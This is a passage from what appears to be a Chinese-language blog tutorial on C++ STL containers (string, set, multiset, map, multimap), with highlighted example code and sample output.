class="built_in">insert</span>(it+<span class="number">1</span>,<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line"></span><br><span class="line">**访问 string 对象的元素**</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用下标方式随机访问 string 对象的元素，下标是从 0 开始计数的。string对象的元素是一个字符（char）</span></span><br><span class="line">cout&lt;&lt;s\[<span class="number">0</span>\]&lt;&lt;endl;</span><br></pre></td></tr></table></figure>
<p><strong>删除 string 对象的元素</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//删除第 3 个元素，元素位置从 0 开始计数</span></span><br><span class="line">s.<span class="built_in">erase</span>(it+<span class="number">3</span>); </span><br><span class="line"><span class="comment">//删除 0~4 区间的所有元素 </span></span><br><span class="line">s.<span class="built_in">erase</span>(it,it+<span class="number">4</span>); </span><br><span class="line"><span class="comment">//清空字符串</span></span><br><span class="line">s=<span class="string">&quot;&quot;</span>;<span class="comment">//注意：空格亦是字符，不可将空格赋予s</span></span><br></pre></td></tr></table></figure>
<p><strong>返回 string 对象的长度</strong></p>
<p>采用 length()方法可返回字符串的长度；采用
empty()方法，可返回字符串是否为空，如果字符串为空，则返回逻辑真，即
1，否则，返回逻辑假，即 0。</p>
<p><strong>注</strong>，字符串长度用length()方法，vector长度用size()方法</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">s.<span class="built_in">length</span>()</span><br><span class="line">s.<span class="built_in">empty</span>()</span><br></pre></td></tr></table></figure>
<p><strong>替换 string 对象的字符</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">string s; </span><br><span class="line">s=<span class="string">&quot;abc123456&quot;</span>; </span><br><span class="line"><span class="comment">//从第 4 个开始，将连续的 3 个字符替换为“good” </span></span><br><span class="line"><span class="comment">//即将“abc”替换为“good” </span></span><br><span class="line">s.<span class="built_in">replace</span>(<span class="number">3</span>,<span class="number">3</span>,<span class="string">&quot;good&quot;</span>);</span><br><span class="line"><span class="comment">//输出</span></span><br><span class="line">abcgood456</span><br></pre></td></tr></table></figure>
<p><strong>搜索 string 对象的元素或子串</strong></p>
<p>采用
find()方法可查找字符串中的第一个字符元素（char，用单引号界定）或者子串（用双引号界定），如果查到，则返回下标值（从
0 开始计数），如果查不到，则返回 4294967295。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//查找字符</span></span><br><span class="line">s.<span class="built_in">find</span>(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line"><span class="comment">//查找子串</span></span><br><span class="line">s.<span class="built_in">find</span>(<span class="string">&quot;cat&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><strong>string 对象的比较</strong></p>
<p>string 对象可与使用
compare()方法与其他字符串相比较。如果它比对方大，则返回
1；如果它比对方小，则返回-1；如果它与对方相同（相等），则返回 0。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">s.<span class="built_in">compare</span>(<span class="string">&quot;cat&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><strong>string 对象与数值相互转换</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sstream&gt;</span> </span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std; </span><br><span class="line"></span><br><span class="line"><span class="comment">//C++方法：将数值转换为 string </span></span><br><span class="line"><span class="function">string <span class="title">convertToString</span><span class="params">(<span class="type">double</span> x)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">ostringstream o; </span><br><span class="line"><span class="keyword">if</span> (o &lt;&lt; x) </span><br><span class="line"><span class="keyword">return</span> o.<span class="built_in">str</span>(); </span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;conversion error&quot;</span>;<span class="comment">//if error </span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">//C++方法：将 string 转换为数值 </span></span><br><span class="line"><span class="function"><span class="type">double</span> <span class="title">convertFromString</span><span class="params">(<span class="type">const</span> string &amp;s)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"><span class="function">istringstream <span class="title">i</span><span class="params">(s)</span></span>; </span><br><span class="line"><span class="type">double</span> x; </span><br><span class="line"><span class="keyword">if</span> (i &gt;&gt; x) </span><br><span class="line"><span class="keyword">return</span> x; </span><br><span class="line"><span class="keyword">return</span> <span class="number">0.0</span>;<span class="comment">//if error </span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>\* argv\[\])</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"><span class="comment">//将数值转换为 string 的第一种方法：C 方法 </span></span><br><span class="line"><span class="type">char</span> b\[<span class="number">10</span>\]; </span><br><span class="line">string a; </span><br><span class="line"><span class="built_in">sprintf</span>(b,<span class="string">&quot;%d&quot;</span>,<span class="number">1975</span>); </span><br><span class="line">a=b; </span><br><span class="line">cout&lt;&lt;a&lt;&lt;endl; </span><br><span class="line"></span><br><span class="line"><span class="comment">//将数值转换为 string 的第二种方法：C++方法 </span></span><br><span class="line">string cc=<span class="built_in">convertToString</span>(<span class="number">1976</span>); </span><br><span class="line">cout&lt;&lt;cc&lt;&lt;endl; </span><br><span class="line"></span><br><span class="line"><span class="comment">//将 string 转换为数值的方法：C++方法 </span></span><br><span class="line">string dd=<span class="string">&quot;2006&quot;</span>; <span class="comment">//必须是数字字符串如：“2902”/“32367”等，若是“abc&quot;则返回”0.0“</span></span><br><span class="line"><span class="type">int</span> p=<span class="built_in">convertFromString</span>(dd)+<span class="number">2</span>; </span><br><span class="line">cout&lt;&lt;p&lt;&lt;endl; </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="set-集合容器">3、set 集合容器</h2>
<p>set 集合容器实现了红黑树（Red-Black
Tree）的平衡二叉检索树的数据结构，在插入元素时，它会自动调整二叉树的排列，把该元素放到适当的位置，以确保每个子树根节点的键值大于左子树所有节点的键值，而小于右子树所有节点的键值；另外，还得确保根节点左子树的高度与右子树的高度相等。要注意的是，它不会重复插入相同键值的元素，而采取忽略处理。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/03/img_640fea1430a5a.png" /></p>
<p>平衡二叉检索树的检索使用中序遍历算法。另外，对于 set
容器中的键值，不可直接去修改。</p>
<p><strong>创建 set 集合对象</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//头文件：“#include &lt;set&gt;”</span></span><br><span class="line">set&lt;<span class="type">int</span>&gt; s;</span><br></pre></td></tr></table></figure>
<p><strong>元素的插入与中序遍历</strong></p>
<p>采用
insert()方法把元素插入集合中去，插入的具体规则在默认的比较规则下，是按元素值由小到大插入，如果自己指定了比较规则函数，则按自定义比较规则函数插入。使用前向迭代器对集合中序遍历，其结果正好是元素排序的结果。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">s.<span class="built_in">insert</span>(<span class="number">12</span>);</span><br></pre></td></tr></table></figure>
<p><strong>反向遍历</strong></p>
<p>使用反向迭代器 reverse_iterator
可以反向遍历集合，输出的结果正好是集合元素的反向排序结果。它需要用到
rbegin()和
rend()两个方法，它们分别给出了反向遍历的开始位置和结束位置。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//反向遍历集合中的元素 </span></span><br><span class="line">set&lt;<span class="type">int</span>&gt;::reverse\_iterator rit;<span class="comment">//定义反向迭代器 </span></span><br><span class="line"><span class="keyword">for</span>(rit=s.<span class="built_in">rbegin</span>();rit!=s.<span class="built_in">rend</span>();rit++) </span><br><span class="line">&#123; </span><br><span class="line">cout&lt;&lt;\*rit&lt;&lt;<span class="string">&quot; &quot;</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>元素的删除</strong></p>
<p>删除的对象可以是某个迭代器位置上的元素、等于某键值的元素、一个区间上的元素和清空集合。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">s.<span class="built_in">erase</span>(<span class="number">6</span>);</span><br><span class="line">s.<span class="built_in">clear</span>();</span><br></pre></td></tr></table></figure>
<p><strong>元素的检索</strong></p>
<p>使用
find()方法对集合进行搜索，如果找到查找的键值，则返回该键值的迭代器位置，否则，返回集合最后一个元素<strong>后面的一个位置</strong>，即
end()。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">set&lt;<span class="type">int</span>&gt;::iterator it;<span class="comment">//定义前向迭代器 </span></span><br><span class="line"><span class="comment">//查找键值为 6 的元素 </span></span><br><span class="line">it=s.<span class="built_in">find</span>(<span class="number">6</span>); </span><br><span class="line"><span class="keyword">if</span>(it!=s.<span class="built_in">end</span>())<span class="comment">//找到 </span></span><br><span class="line">    cout&lt;&lt;\*it&lt;&lt;endl; </span><br><span class="line"><span class="keyword">else</span><span class="comment">//没找到 </span></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;not find it&quot;</span>&lt;&lt;endl;</span><br></pre></td></tr></table></figure>
<p><strong>自定义比较函数</strong></p>
<p>使用
insert()将元素插入到集合中去的时候，集合会根据设定的比较函数将该元素放到该放的节点上去。在定义集合的时候，如果没有指定比较函数，那么采用默认的比较函数，即按键值由小到大的顺序插入元素。</p>
<ul>
<li>如果元素不是结构体，那么，可以编写比较函数。示例比较规则是要求按键值由大到小的顺序将元素插入到集合中：</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;set&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span> </span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std; </span><br><span class="line"></span><br><span class="line"><span class="comment">//自定义比较函数 myComp，重载“()”操作符 </span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">myComp</span> </span><br><span class="line">&#123; </span><br><span class="line">  <span class="function"><span class="type">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">const</span> <span class="type">int</span> &amp;a,<span class="type">const</span> <span class="type">int</span> &amp;b)</span> </span></span><br><span class="line"><span class="function">  </span>&#123; </span><br><span class="line">    <span class="keyword">return</span> a&gt;b; </span><br><span class="line">  &#125; </span><br><span class="line">&#125;; </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>\* argv\[\])</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">  <span class="comment">//定义元素类型为 int 的集合对象 s，当前没有任何元素 </span></span><br><span class="line">  <span class="comment">//采用的比较函数是 myComp </span></span><br><span class="line">  set&lt;<span class="type">int</span>,myComp&gt; s; </span><br><span class="line">  <span class="comment">//插入了 5 个元素，但由于 8 有重复，所以第二次插入的 8 并没有执行 </span></span><br><span class="line">  s.<span class="built_in">insert</span>(<span class="number">8</span>);<span class="comment">//第一次插入 8，可以插入 </span></span><br><span class="line">  s.<span class="built_in">insert</span>(<span class="number">1</span>); </span><br><span class="line">  s.<span class="built_in">insert</span>(<span class="number">12</span>); </span><br><span class="line">  s.<span class="built_in">insert</span>(<span class="number">6</span>); </span><br><span class="line">  s.<span class="built_in">insert</span>(<span class="number">8</span>);<span class="comment">//第二次插入 8，重复元素，不会插入 </span></span><br><span class="line">  set&lt;<span class="type">int</span>,myComp&gt;::iterator it;<span class="comment">//定义前向迭代器 </span></span><br><span class="line">  <span class="keyword">for</span>(it=s.<span class="built_in">begin</span>();it!=s.<span class="built_in">end</span>();it++) </span><br><span class="line">  &#123; </span><br><span class="line">    cout&lt;&lt;\*it&lt;&lt;<span class="string">&quot; &quot;</span>; </span><br><span class="line">  &#125;</span><br><span class="line">  cout&lt;&lt;endl; </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//运行结果：12 8 6 1</span></span><br></pre></td></tr></table></figure>
<ul>
<li>如果元素是结构体，那么，可以直接把比较函数写在结构体内。</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;set&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span> </span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std; </span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Info</span> </span><br><span class="line">&#123; </span><br><span class="line">  string name; </span><br><span class="line">  <span class="type">float</span> score; </span><br><span class="line">  <span class="comment">//重载“&lt;”操作符，自定义排序规则 </span></span><br><span class="line">  <span class="type">bool</span> <span class="keyword">operator</span> &lt; (<span class="type">const</span> Info &amp;a) <span class="type">const</span> </span><br><span class="line">  &#123; </span><br><span class="line">  <span class="comment">//按 score 由大到小排列。如果要由小到大排列，使用“&gt;”号即可。 </span></span><br><span class="line">    <span class="keyword">return</span> a.score&lt;score; </span><br><span class="line">  &#125; </span><br><span class="line">&#125;; </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>\* argv\[\])</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">  <span class="comment">//定义元素类型为 Info 结构体的集合对象 s，当前没有任何元素 </span></span><br><span class="line">  set&lt;Info&gt; s; </span><br><span class="line">  <span class="comment">//定义 Info 类型的元素 </span></span><br><span class="line">  Info info; </span><br><span class="line">  <span class="comment">//插入 3 个元素 </span></span><br><span class="line">  info.name=<span class="string">&quot;Jack&quot;</span>; </span><br><span class="line">  info.score=<span class="number">80.5</span>; </span><br><span class="line">  s.<span class="built_in">insert</span>(info); </span><br><span class="line">  info.name=<span class="string">&quot;Tomi&quot;</span>; </span><br><span class="line">  info.score=<span class="number">20.5</span>; </span><br><span class="line">  s.<span class="built_in">insert</span>(info); </span><br><span class="line">  info.name=<span class="string">&quot;Nacy&quot;</span>; </span><br><span class="line">  info.score=<span class="number">60.5</span>; </span><br><span class="line">  s.<span class="built_in">insert</span>(info); </span><br><span class="line">  set&lt;Info&gt;::iterator it;<span class="comment">//定义前向迭代器 </span></span><br><span class="line">  <span class="keyword">for</span>(it=s.<span class="built_in">begin</span>();it!=s.<span class="built_in">end</span>();it++) </span><br><span class="line">  &#123; </span><br><span class="line">    cout&lt;&lt;(\*it).name&lt;&lt;<span class="string">&quot; : &quot;</span>&lt;&lt;(\*it).score&lt;&lt;endl; </span><br><span class="line">  &#125; </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">//运行结果：</span></span><br><span class="line">Jack : <span class="number">80.5</span> </span><br><span class="line">Nacy : <span class="number">60.5</span> </span><br><span class="line">Tomi : <span class="number">20.5</span></span><br></pre></td></tr></table></figure>
<h2 id="multiset-多重集合容器">4、multiset 多重集合容器</h2>
<p>multiset 与 set
一样，也是使用红黑树来组织元素数据的，唯一不同的是，multiset
允许重复的元素键值插入，而 set 则不允许。multiset
也需声明头文件包含“#include <set>”。</p>
<p><strong>multiset 元素的插入</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">multiset&lt;string&gt; ms; </span><br><span class="line">ms.<span class="built_in">insert</span>(<span class="string">&quot;abc&quot;</span>); </span><br><span class="line">ms.<span class="built_in">insert</span>(<span class="string">&quot;123&quot;</span>); </span><br><span class="line">ms.<span class="built_in">insert</span>(<span class="string">&quot;123&quot;</span>); </span><br><span class="line"><span class="comment">//123会重复插入</span></span><br></pre></td></tr></table></figure>
<p><strong>multiset 元素的删除</strong></p>
<p>采用 erase()方法可以删除 multiset
对象中的某个迭代器位置上的元素、某段迭代器区间中的元素、键值等于某个值的<strong>所有重复元素</strong>，并<strong>返回删除元素的个数</strong>。采用
clear()方法可以清空元素。</p>
<p><strong>检索元素</strong></p>
<p>使用
find()方法查找元素，如果找到，则返回该元素的迭代器位置（如果该元素存在重复，则返回第一个元素重复元素的迭代器位置）；如果没有找到，则返回
end()迭代器位置。</p>
<h2 id="map-映照容器">5、map 映照容器</h2>
<p>map
映照容器的元素数据是由一个键值和一个映照数据组成的，键值与映照数据之间具有一一映照的关系。
map
映照容器的数据结构也是采用红黑树来实现的，插入元素的键值不允许重复(插入相同键值的元素时，后者会将前者替换掉)，比较函数只对元素的键值进行比较，元素的各项数据可通过键值检索出来。用法与set相似。头文件包含语句#include
<map></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/03/img_641019d131ba8.png" /></p>
<p><strong>map 创建、元素插入和遍历访问</strong></p>
<ul>
<li><strong>示例：</strong></li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;map&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span> </span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std; </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//定义 map 对象，当前没有任何元素</span></span><br><span class="line">map&lt;string,<span class="type">float</span>&gt; m;</span><br><span class="line"><span class="comment">//插入元素，按键值的由小到大放入黑白树中</span></span><br><span class="line">m\[<span class="string">&quot;Jack&quot;</span>\]=<span class="number">98.5</span>;</span><br><span class="line">m\[<span class="string">&quot;Bomi&quot;</span>\]=<span class="number">96.0</span>;</span><br><span class="line">m\[<span class="string">&quot;Kate&quot;</span>\]=<span class="number">97.5</span>;</span><br><span class="line"><span class="comment">//前向遍历元素，反向遍历reverse\_iterator使用同理</span></span><br><span class="line">map&lt;string,<span class="type">float</span>&gt;::iterator it;</span><br><span class="line"><span class="keyword">for</span>(it=m.<span class="built_in">begin</span>();it!=m.<span class="built_in">end</span>();it++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//输出键值与映照数据</span></span><br><span class="line">cout&lt;&lt;(\*it).first&lt;&lt;<span class="string">&quot; : &quot;</span>&lt;&lt;(\*it).second&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">**运行结果：**</span><br><span class="line"></span><br><span class="line">Bomi : <span class="number">96</span></span><br><span class="line">Jack : <span class="number">98.5</span></span><br><span class="line">Kate : <span class="number">97.5</span></span><br></pre></td></tr></table></figure>
<p><strong>注，</strong>程序编译时，会产生代号为“warning
C4786”的警告，“4786”是标记符超长警告的代号。可以在程序的头文件包含代码的前面使用“#pragma
warning(disable:4786)”宏语句，强制编译器忽略该警告。4786
号警告对程序的正确性和运行并无影响。</p>
<p><strong>删除元素</strong></p>
<p>与 set 容器一样，map 映照容器的
erase()删除元素函数，可以删除某个迭代器位置上的元素、等于某个键值的元素、一个迭代器区间上的所有元素，当然，也可使用
clear()方法清空 map 映照容器。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">m.<span class="built_in">erase</span>(<span class="number">28</span>);</span><br></pre></td></tr></table></figure>
<p><strong>检索元素</strong></p>
<p>使用
find()方法来搜索某个<strong>键值</strong>，如果搜索到了，则返回该<strong>键值所在的迭代器位置</strong>，否则，返回
end()迭代器位置。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">it=m.<span class="built_in">find</span>(<span class="number">28</span>);</span><br></pre></td></tr></table></figure>
<p><strong>自定义比较函数</strong></p>
<p>在定义 map
的时候，如果没有指定比较函数，那么采用默认的比较函数，即按键值由小到大的顺序插入元素。</p>
<ul>
<li>元素不是结构体，可以编写比较函数。示例比较规则是要求按键值由大到小的顺序将元素插入到
map 中：</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:4786) </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;map&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span> </span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std; </span><br><span class="line"></span><br><span class="line"><span class="comment">//自定义比较函数 myComp </span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">myComp</span> </span><br><span class="line">&#123; </span><br><span class="line">  <span class="function"><span class="type">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">const</span> <span class="type">int</span> &amp;a,<span class="type">const</span> <span class="type">int</span> &amp;b)</span> </span></span><br><span class="line"><span class="function">  </span>&#123; </span><br><span class="line">    <span class="keyword">return</span> a&gt;b; </span><br><span class="line">  &#125; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>\* argv\[\])</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">  <span class="comment">//定义 map 对象，当前没有任何元素 </span></span><br><span class="line">  map&lt;<span class="type">int</span>,<span class="type">char</span>,myComp&gt; m; </span><br><span class="line">  <span class="comment">//插入元素，按键值的由小到大放入黑白树中 </span></span><br><span class="line">  m\[<span class="number">25</span>\]=<span class="string">&#x27;m&#x27;</span>; </span><br><span class="line">  m\[<span class="number">28</span>\]=<span class="string">&#x27;k&#x27;</span>; </span><br><span class="line">  m\[<span class="number">10</span>\]=<span class="string">&#x27;x&#x27;</span>; </span><br><span class="line">  m\[<span class="number">30</span>\]=<span class="string">&#x27;a&#x27;</span>; </span><br><span class="line">  <span class="comment">//使用前向迭代器中序遍历 map </span></span><br><span class="line">  map&lt;<span class="type">int</span>,<span class="type">char</span>,myComp&gt;::iterator it; </span><br><span class="line">  <span class="keyword">for</span>(it=m.<span class="built_in">begin</span>();it!=m.<span class="built_in">end</span>();it++) </span><br><span class="line">  &#123; </span><br><span class="line">    cout&lt;&lt;(\*it).first&lt;&lt;<span class="string">&quot; : &quot;</span>&lt;&lt;(\*it).second&lt;&lt;endl; </span><br><span class="line">  &#125; </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">**运行结果：**</span><br><span class="line"></span><br><span class="line"><span class="number">30</span> : a </span><br><span class="line"><span class="number">28</span> : k </span><br><span class="line"><span class="number">25</span> : m </span><br><span class="line"><span class="number">10</span> : x</span><br></pre></td></tr></table></figure>
<ul>
<li>如果元素是结构体，那么，可以直接把比较函数写在结构体内。下面的程序详细说明了如何操作：</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:4786) </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span> </span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std; </span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Info</span> </span><br><span class="line">&#123; </span><br><span class="line">  string name; </span><br><span class="line">  <span class="type">float</span> score; </span><br><span class="line">  <span class="comment">//重载“&lt;”操作符，自定义排序规则 </span></span><br><span class="line">  <span class="type">bool</span> <span class="keyword">operator</span> &lt; (<span class="type">const</span> Info &amp;a) <span class="type">const</span> </span><br><span class="line">  &#123; </span><br><span class="line">    <span class="comment">//按 score 由大到小排列。如果要由小到大排列，使用“&gt;”号即可 </span></span><br><span class="line">    <span class="keyword">return</span> a.score&lt;score; </span><br><span class="line">  &#125; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>\* argv\[\])</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">  <span class="comment">//定义 map 对象，当前没有任何元素 </span></span><br><span class="line">  map&lt;Info,<span class="type">int</span>&gt; m; </span><br><span class="line">  <span class="comment">//定义 Info 结构体变量 </span></span><br><span class="line">  Info info; </span><br><span class="line">  <span class="comment">//插入元素，按键值的由小到大放入黑白树中 </span></span><br><span class="line">  info.name=<span class="string">&quot;Jack&quot;</span>; </span><br><span class="line">  info.score=<span class="number">60</span>; </span><br><span class="line">  m\[info\]=<span class="number">25</span>; </span><br><span class="line">  info.name=<span class="string">&quot;Bomi&quot;</span>; </span><br><span class="line">  info.score=<span class="number">80</span>; </span><br><span class="line">  m\[info\]=<span class="number">10</span>; </span><br><span class="line">  info.name=<span class="string">&quot;Peti&quot;</span>; </span><br><span class="line">  info.score=<span class="number">66.5</span>; </span><br><span class="line">  m\[info\]=<span class="number">30</span>; </span><br><span class="line">  <span class="comment">//使用前向迭代器中序遍历 map </span></span><br><span class="line">  map&lt;Info,<span class="type">int</span>&gt;::iterator it; </span><br><span class="line">  <span class="keyword">for</span>(it=m.<span class="built_in">begin</span>();it!=m.<span class="built_in">end</span>();it++) </span><br><span class="line">  &#123; </span><br><span class="line">    cout&lt;&lt;(\*it).second&lt;&lt;<span class="string">&quot; : &quot;</span>; </span><br><span class="line">    cout&lt;&lt;((\*it).first).name&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;((\*it).first).score&lt;&lt;endl; </span><br><span class="line">  &#125; </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">**运行结果：**</span><br><span class="line"></span><br><span class="line"><span class="number">10</span> : Bomi <span class="number">80</span> </span><br><span class="line"><span class="number">30</span> : Peti <span class="number">66.5</span> </span><br><span class="line"><span class="number">25</span> : Jack <span class="number">60</span></span><br></pre></td></tr></table></figure>
<h2 id="multimap-多重映照容器">6、multimap 多重映照容器</h2>
<p>multimap 与 map 基本相同，唯独不同的是，multimap
允许插入重复键值的元素。</p>
<p><strong>multimap 对象创建、元素插入</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//定义 map 对象，当前没有任何元素 </span></span><br><span class="line">multimap&lt;string,<span class="type">double</span>&gt; m; </span><br><span class="line"><span class="comment">//插入元素 </span></span><br><span class="line">m.<span class="built_in">insert</span>(<span class="built_in">pair</span>&lt;string,<span class="type">double</span>&gt;(<span class="string">&quot;Jack&quot;</span>,<span class="number">300.5</span>)); </span><br><span class="line">m.<span class="built_in">insert</span>(<span class="built_in">pair</span>&lt;string,<span class="type">double</span>&gt;(<span class="string">&quot;Kity&quot;</span>,<span class="number">200</span>)); </span><br><span class="line">m.<span class="built_in">insert</span>(<span class="built_in">pair</span>&lt;string,<span class="type">double</span>&gt;(<span class="string">&quot;Memi&quot;</span>,<span class="number">500</span>)); </span><br><span class="line"><span class="comment">//重复插入键值“Jack” </span></span><br><span class="line">m.<span class="built_in">insert</span>(<span class="built_in">pair</span>&lt;string,<span class="type">double</span>&gt;(<span class="string">&quot;Jack&quot;</span>,<span class="number">306</span>)); </span><br><span class="line"><span class="comment">//使用前向迭代器中序遍历 multimap </span></span><br><span class="line">multimap&lt;string,<span class="type">double</span>&gt;::iterator it; </span><br><span class="line"><span class="keyword">for</span>(it=m.<span class="built_in">begin</span>();it!=m.<span class="built_in">end</span>();it++) </span><br><span class="line">&#123; </span><br><span class="line">  cout&lt;&lt;(\*it).first&lt;&lt;<span class="string">&quot; : &quot;</span>&lt;&lt;(\*it).second&lt;&lt;endl; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>元素的删除</strong></p>
<p>删除操作采用
erase()方法，可删除某个迭代器位置上的元素、等于某个键值的<strong>所有重复元素</strong>、一个迭代器区间上的元素。使用
clear()方法可将 multimap 容器中的元素清空。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//删除键值等于“Jack”的元素 </span></span><br><span class="line">m.<span class="built_in">erase</span>(<span class="string">&quot;Jack&quot;</span>);</span><br></pre></td></tr></table></figure>
<p><strong>元素的查找</strong></p>
<p>由于 multimap 存在重复的键值，所以
find()方法只返回重复键值中的第一个元素的迭代器位置，如果没有找到该键值，则返回
end()迭代器位置。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">it=m.<span class="built_in">find</span>(<span class="string">&quot;Jack&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(it!=m.<span class="built_in">end</span>())<span class="comment">//找到 </span></span><br><span class="line">&#123; </span><br><span class="line">  …………</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span><span class="comment">//没找到 </span></span><br><span class="line">&#123; </span><br><span class="line">  …………</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="deque-双端队列容器"><strong>7、deque 双端队列容器</strong></h2>
